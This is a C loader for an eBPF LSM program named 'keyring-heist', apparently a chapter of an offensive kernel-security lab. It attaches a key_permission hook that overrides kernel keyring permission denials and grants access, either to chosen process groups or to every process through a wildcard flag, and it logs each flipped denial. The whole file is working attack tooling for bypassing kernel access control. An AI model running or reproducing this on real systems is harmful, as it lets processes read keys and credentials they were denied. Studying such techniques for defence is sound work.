// ch08 LSM-variant loader: attaches SEC("lsm.s/key_permission") fmod_ret.
// Fails fast with a clear CH08_SKIP reason if the host kernel doesn't
// expose BPF LSM.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <getopt.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include "ch08-keyring-heist-lsm.skel.h"

#define KEY_TYPE_NAME_LEN 16

struct evt {
    unsigned int pid, tgid;
    char comm[16];
    unsigned int serial;
    unsigned int need_perm;
    int orig_ret;
    int flipped;
    char type_name[KEY_TYPE_NAME_LEN];
};

static volatile sig_atomic_t stop;
static void on_sig(int s){ (void)s; stop = 1; }

static int handle(void *ctx, void *data, size_t sz)
{
    (void)ctx;
    if (sz < sizeof(struct evt)) return 0;
    const struct evt *e = data;
    if (e->flipped) {
        printf("[ch08] FLIP\tpid=%u\tserial=0x%08x\ttype=%-.*s\torig=%d\t-> 0 (granted)\n",
               e->pid, e->serial,
               KEY_TYPE_NAME_LEN, e->type_name[0] ? e->type_name : "?",
               e->orig_ret);
        fflush(stdout);
    }
    return 0;
}

static int check_lsm_bpf_enabled(char *reason, size_t rlen)
{
    FILE *f = fopen("/sys/kernel/security/lsm", "r");
    if (!f) {
        snprintf(reason, rlen, "/sys/kernel/security/lsm unreadable");
        return 0;
    }
    char buf[512] = {0};
    if (!fgets(buf, sizeof(buf), f)) {
        fclose(f);
        snprintf(reason, rlen, "/sys/kernel/security/lsm empty");
        return 0;
    }
    fclose(f);
    if (!strstr(buf, "bpf")) {
        snprintf(reason, rlen,
                 "kernel lacks 'bpf' in /sys/kernel/security/lsm (boot with lsm=bpf,...)");
        return 0;
    }
    return 1;
}

static void usage(const char *argv0)
{
    fprintf(stderr,
        "Usage: %s [-a] [-t tgid]... [-h]\n"
        "  -a     wildcard: flip every key_permission denial\n"
        "  -t N   flip key_permission denials originating from tgid N\n"
        "  -h     show this help\n",
        argv0);
}

int main(int argc, char **argv)
{
    unsigned int tgid_args[1024];
    int n_tgid = 0;
    int all = 0;
    int opt;
    while ((opt = getopt(argc, argv, "at:h")) != -1) {
        switch (opt) {
        case 'a': all = 1; break;
        case 't':
            if (n_tgid < 1024)
                tgid_args[n_tgid++] = (unsigned int)atoi(optarg);
            break;
        case 'h':
            usage(argv[0]);
            return 0;
        default:
            usage(argv[0]);
            return 2;
        }
    }

    char skip_reason[256] = {0};
    if (!check_lsm_bpf_enabled(skip_reason, sizeof(skip_reason))) {
        fprintf(stderr, "CH08_SKIP reason=\"%s\"\n", skip_reason);
        return 3;
    }
    fprintf(stderr, "[ch08] BPF LSM is active - proceeding\n");

    struct ch08_keyring_heist_lsm_bpf *s =
        ch08_keyring_heist_lsm_bpf__open_and_load();
    if (!s) {
        fprintf(stderr, "[ch08] open_and_load: %s\n", strerror(errno));
        return 1;
    }

    int err = ch08_keyring_heist_lsm_bpf__attach(s);
    if (err) {
        fprintf(stderr, "[ch08] attach: %s\n", strerror(-err));
        ch08_keyring_heist_lsm_bpf__destroy(s);
        return 1;
    }

    if (all) {
        unsigned int z = 0, v = 1;
        bpf_map__update_elem(s->maps.target_tgids, &z, sizeof(z),
                             &v, sizeof(v), BPF_ANY);
        fprintf(stderr, "[ch08] mode=wildcard\n");
    }
    for (int i = 0; i < n_tgid; i++) {
        unsigned int v = 1;
        bpf_map__update_elem(s->maps.target_tgids,
                             &tgid_args[i], sizeof(tgid_args[i]),
                             &v, sizeof(v), BPF_ANY);
        fprintf(stderr, "[ch08] target=%u\n", tgid_args[i]);
    }

    struct ring_buffer *rb =
        ring_buffer__new(bpf_map__fd(s->maps.events), handle, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "[ch08] ring_buffer__new: %s\n", strerror(errno));
        ch08_keyring_heist_lsm_bpf__destroy(s);
        return 1;
    }

    struct sigaction sa = { .sa_handler = on_sig };
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);

    fprintf(stderr, "[ch08] active - key_permission denials for targeted tgids will be flipped\n");

    while (!stop) {
        int n = ring_buffer__poll(rb, 200);
        if (n < 0 && n != -EINTR) break;
    }
    ring_buffer__free(rb);
    ch08_keyring_heist_lsm_bpf__destroy(s);
    return 0;
}
